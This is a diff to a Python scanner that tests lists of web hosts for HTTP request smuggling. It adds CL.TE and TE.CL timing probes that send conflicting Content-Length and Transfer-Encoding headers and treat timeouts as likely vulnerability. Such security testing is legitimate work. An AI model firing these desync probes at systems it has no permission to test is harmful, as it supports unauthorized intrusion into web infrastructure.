@@ -2,6 +2,7 @@ import argparse
 import asyncio
 import concurrent
 import socket
+import time
 import ssl
 from urllib.parse import urlparse
 
@@ -39,7 +40,79 @@ def check_http2(domain_name):
         return
 
 
-async def individual_request(loop, executor, target):
+async def cl_te_test(loop, executor, target):
+    # Test for the Frontend checking CL but backend checks TE
+    target = target.strip()
+    success = False
+    timeout_delay = 61
+    start = 0.0
+    body = """3
+    abc
+    Q"""
+    if "http" not in target:
+        target = "https://" + target
+    try:
+        reusable_conn = aiohttp.TCPConnector(keepalive_timeout=900, ssl=False)
+        start = time.time()
+        async with aiohttp.ClientSession(timeout=900, connector=reusable_conn, headers={
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Safari/537.36"}) as session:
+                async with session.post(target + "/about", allow_redirects=False, timeout=timeout_delay, data=body,
+                                        skip_auto_headers=["Content-Length"],
+                                        headers={"Content-Length": str(6), "Transfer-Encoding": "chunked"}) as response_mid:
+                    # If we timeout, potentially vulnerable
+                    if response_mid.status == 408:
+                        print(f"{Fore.GREEN}[!!!] Timeout: {target} may be vulnerable to DeSync via CL.TE payloads. Frontend uses CL, backend TE.{Style.RESET_ALL}")
+                        success = True
+    except Exception as e:
+        # A timeout is the success condition here
+        err_time = time.time()
+        processing_time = err_time - start
+        if "timeout" in str(e).lower():
+            print(f"[+] Timeout: Host may be vulnerable to DeSync via CL.TE payloads. Frontend uses CL, backend TE. The error: {e}")
+            success = True
+        elif "Server disconnected" == str(e) and processing_time > 15:
+            print(f"{Fore.GREEN}[!!!] Timeout: {target} may be vulnerable to DeSync via CL.TE payloads. Frontend uses CL, backend TE.{Style.RESET_ALL}")
+            success = True
+    return (success, target)
+
+
+async def te_cl_test(loop, executor, target):
+    # Test for the Frontend checking TE but backend checks CL
+    target = target.strip()
+    success = False
+    timeout_delay = 61
+    start = 0.0
+    body = """0
+    
+    X"""
+    if "http" not in target:
+        target = "https://" + target
+    try:
+        start = time.time()
+        reusable_conn = aiohttp.TCPConnector(keepalive_timeout=900, ssl=False)
+        async with aiohttp.ClientSession(timeout=900, connector=reusable_conn, headers={
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Safari/537.36"}) as session:
+                async with session.post(target + "/about", allow_redirects=False, timeout=61, data=body,
+                                        skip_auto_headers=["Content-Length"],
+                                        headers={"Content-Length": str(6), "Transfer-Encoding": "chunked"}) as response_mid:
+                    # If we timeout, potentially vulnerable
+                    if response_mid.status == 408:
+                        print(f"{Fore.GREEN}[!!!] Timeout: {target} may be vulnerable to DeSync via TE.CL payloads. Frontend uses TE, backend CL.{Style.RESET_ALL}")
+                        success = True
+    except Exception as e:
+        # A timeout error is the success condition here
+        err_time = time.time()
+        processing_time = err_time - start
+        if "timeout" in str(e).lower():
+            print(f"[+] Host may be vulnerable to DeSync via TE.CL payloads. Frontend uses TE, backend CL. The error: {e}")
+            success = True
+        elif "Server disconnected" == str(e) and processing_time > 15:
+            print(f"{Fore.GREEN}[!!!] Timeout: {target} may be vulnerable to DeSync via TE.CL payloads. Frontend uses TE, backend CL.{Style.RESET_ALL}")
+            success = True
+    return (success, target)
+                    
+
+async def cl0_test(loop, executor, target):
     target = target.strip()
     if "http" not in target:
         target = "https://" + target
@@ -112,13 +185,23 @@ X: Y"""
     return (target, this_server, this_code)
 
 
-async def main(urls):
-    coroutines = [individual_request(loop, executor, url) for url in urls]
+async def cl0_runner(urls):
+    coroutines = [cl0_test(loop, executor, url) for url in urls]
+    results = await asyncio.gather(*coroutines)
+    return results
+
+async def cl_te_runner(urls):
+    coroutines = [cl_te_test(loop, executor, url) for url in urls]
+    results = await asyncio.gather(*coroutines)
+    return results
+
+async def te_cl_runner(urls):
+    coroutines = [te_cl_test(loop, executor, url) for url in urls]
     results = await asyncio.gather(*coroutines)
     return results
 
 
-def quick_stats(results):
+def cl0_stats(results):
     stats_dict = {}
     platform_set = set()
     for item in results:
@@ -130,12 +213,31 @@ def quick_stats(results):
             else:
                 stats_dict[temp] += 1
 
-    print_stats_table(results, platform_set)
+    field_names = ["Platform", "De-Synced Host", "HTTP Code"]
+    print_stats_table(results, platform_set, field_names)
 
-
-def print_stats_table(results, platform_set):
+def cl_te_stats(results):
     x = PrettyTable()
-    x.field_names = ["Platform", "De-Synced Host", "HTTP Code"]
+    x.field_names = ["CL.TE Desync possible"]
+    for entry in results:
+        x.add_row([entry[1]])
+    x.align = "l"
+    print("")
+    print(x)
+
+
+def te_cl_stats(results):
+    x = PrettyTable()
+    x.field_names = ["TE.CL Desync possible"]
+    for entry in results:
+        x.add_row([entry[1]])
+    x.align = "l"
+    print("")
+    print(x)
+
+def print_stats_table(results, platform_set, field_names):
+    x = PrettyTable()
+    x.field_names = field_names
 
     # I know this is horrible
     for item in platform_set:
@@ -154,14 +256,19 @@ parser.add_argument("-t", "--targets", help="Input file list of FQDN like https:
 parser.add_argument("-o", "--oneshot", help="A single FQDN to visit")
 args = parser.parse_args()
 server_list = []
+server_list2 = []
 
 if args.targets:
     with open(args.targets, 'r') as targetfile:
         targetlist = targetfile.readlines()
-        server_list = loop.run_until_complete((main(targetlist)))
+        server_list = loop.run_until_complete((cl0_runner(targetlist)))
+        server_list2 = loop.run_until_complete((cl_te_runner(targetlist)))
+        server_list3 = loop.run_until_complete((te_cl_runner(targetlist)))
 
 elif args.oneshot:
-    server_list = loop.run_until_complete((main([args.oneshot])))
+    server_list = loop.run_until_complete((cl0_runner([args.oneshot])))
+    server_list2 = loop.run_until_complete((cl_te_runner([args.oneshot])))
+    server_list3 = loop.run_until_complete((te_cl_runner([args.oneshot])))
 else:
     parser.print_help()
     exit()
@@ -173,6 +280,19 @@ for server in server_list:
         if server[1] != "Unable to detect platform" and server[0] != "failed" and server[3]:
             num_success += 1
             valid_list.append(server)
-quick_stats(valid_list)
+cl0_stats(valid_list)
+
+cl_te_success = []
+for server in server_list2:
+    if server[0]:
+        cl_te_success.append(server)
+cl_te_stats(cl_te_success)
+
+te_cl_success = []
+for server in server_list3:
+    if server[0]:
+        te_cl_success.append(server)
+te_cl_stats(te_cl_success)
+
 if not args.oneshot:
     print(f"Detected {num_success} potentially vulnerable hosts out of {len(targetlist)} Hosts.")
